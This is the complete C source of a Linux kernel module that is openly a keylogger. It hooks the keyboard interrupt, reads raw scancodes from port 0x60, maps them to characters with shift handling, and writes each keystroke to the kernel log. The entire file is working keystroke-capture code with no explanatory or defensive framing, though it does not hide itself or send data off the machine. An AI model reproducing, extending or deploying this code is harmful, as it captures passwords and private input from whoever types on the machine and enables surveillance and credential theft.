#include <linux/init.h>
#include <linux/string.h>
#include <asm/io.h>
#include <linux/module.h>
#include <linux/interrupt.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("BlazedEngima");

#define KB_IRQ 1

// Keylog data struct 
struct keylog_data {
  unsigned char scancode;

} data;

// Declarations
irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs);
void tasklet_logger(struct tasklet_struct *p);

// Function definitions
//
// The tasklet logger
void tasklet_logger(struct tasklet_struct *p) {
  static int shift = 0;

  char buf[32];
  memset(buf, 1, sizeof(buf));

  switch(data.scancode) {
    default: return;

    case 1: strcpy(buf, "(ESC)"); break;
    case 2: strcpy(buf, (shift) ? "!" : "1"); break;
    case 3: strcpy(buf, (shift) ? "@" : "2"); break;
    case 4: strcpy(buf, (shift) ? "#" : "3"); break;
    case 5: strcpy(buf, (shift) ? "$" : "4"); break;
    case 6: strcpy(buf, (shift) ? "%" : "5"); break;
    case 7: strcpy(buf, (shift) ? "^" : "6"); break;
    case 8: strcpy(buf, (shift) ? "&" : "7"); break;
    case 9: strcpy(buf, (shift) ? "*" : "8"); break;
    case 10: strcpy(buf, (shift) ? "(" : "9"); break;
    case 11: strcpy(buf, (shift) ? ")" : "0"); break;
    case 12: strcpy(buf, (shift) ? "_" : "-"); break;
    case 13: strcpy(buf, (shift) ? "+" : "="); break;
    case 14: strcpy(buf, "(BACK)"); break;
    case 15: strcpy(buf, "(TAB)"); break;
    case 16: strcpy(buf, (shift) ? "Q" : "q"); break;
    case 17: strcpy(buf, (shift) ? "W" : "w"); break;
    case 18: strcpy(buf, (shift) ? "E" : "e"); break;
    case 19: strcpy(buf, (shift) ? "R" : "r"); break;
    case 20: strcpy(buf, (shift) ? "T" : "t"); break;
    case 21: strcpy(buf, (shift) ? "Y" : "y"); break;
    case 22: strcpy(buf, (shift) ? "U" : "u"); break;
    case 23: strcpy(buf, (shift) ? "I" : "i"); break;
    case 24: strcpy(buf, (shift) ? "O" : "o"); break;
    case 25: strcpy(buf, (shift) ? "P" : "p"); break;
    case 26: strcpy(buf, (shift) ? "{" : "["); break;
    case 27: strcpy(buf, (shift) ? "}" : "]"); break;
    case 28: strcpy(buf, "(ENTER)"); break;
    case 29: strcpy(buf, "(CTRL)"); break;
    case 30: strcpy(buf, (shift) ? "A" : "a"); break;
    case 31: strcpy(buf, (shift) ? "S" : "s"); break;
    case 32: strcpy(buf, (shift) ? "D" : "d"); break;
    case 33: strcpy(buf, (shift) ? "F" : "f"); break;
    case 34: strcpy(buf, (shift) ? "G" : "g"); break;
    case 35: strcpy(buf, (shift) ? "H" : "h"); break;
    case 36: strcpy(buf, (shift) ? "J" : "j"); break;
    case 37: strcpy(buf, (shift) ? "K" : "k"); break;
    case 38: strcpy(buf, (shift) ? "L" : "l"); break;
    case 39: strcpy(buf, (shift) ? ":" : ";"); break;
    case 40: strcpy(buf, (shift) ? "\"" : "'"); break;
    case 41: strcpy(buf, (shift) ? "~" : "`"); break;
    case 42:
    case 54: shift = 1; strcpy(buf, "(SHIFT)"); break;
    case 170:
    case 182: shift = 0; strcpy(buf, "(SHIFT REL)"); break;
    case 44: strcpy(buf, (shift) ? "Z" : "z"); break;
    case 45: strcpy(buf, (shift) ? "X" : "x"); break;
    case 46: strcpy(buf, (shift) ? "C" : "c"); break;
    case 47: strcpy(buf, (shift) ? "V" : "v"); break;
    case 48: strcpy(buf, (shift) ? "B" : "b"); break;
    case 49: strcpy(buf, (shift) ? "N" : "n"); break;
    case 50: strcpy(buf, (shift) ? "M" : "m"); break;
    case 51: strcpy(buf, (shift) ? "<" : ","); break;
    case 52: strcpy(buf, (shift) ? ">" : "."); break;
    case 53: strcpy(buf, (shift) ? "?" : "/"); break;
    case 56: strcpy(buf, "(L-ALT)"); break;
    case 55:
    case 57:
    case 58:
    case 59:
    case 60:
    case 61:
    case 62:
    case 63:
    case 64:
    case 65:
    case 66:
    case 67:
    case 68:
    case 70:
    case 71:
    case 72: strcpy(buf, " "); break;
    case 83:
    strcpy(buf, "(DEL)"); break; 
  }

  printk(KERN_INFO "keylogger log: %s", buf);
}

// Declaring the Tasklet
DECLARE_TASKLET(logging_tasklet, tasklet_logger);

// Main interrupt handler
irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs) {
  data.scancode = inb(0x60);

  tasklet_schedule(&logging_tasklet);
  return (irq_handler_t) IRQ_HANDLED;
}

// Module entry point
static int __init driver_init(void) {
  printk(KERN_INFO "Keylogger initializing....");

  int ret = request_irq(KB_IRQ, (irq_handler_t) kb_irq_handler, IRQF_SHARED, "Custom Keyboard Handler", &data);
  if (ret != 0) {
    printk(KERN_INFO "Keylogger failed to request IRQ for keyboard.\n");
    return -1;
  }

  printk(KERN_INFO "Keylogger installed.\n");
  return ret;
}

// Module exit point
static void __exit driver_exit(void) {
  tasklet_kill(&logging_tasklet);

  free_irq(KB_IRQ, &data);

  printk(KERN_INFO "Keylogger removed.\n");
}

module_init(driver_init);
module_exit(driver_exit);
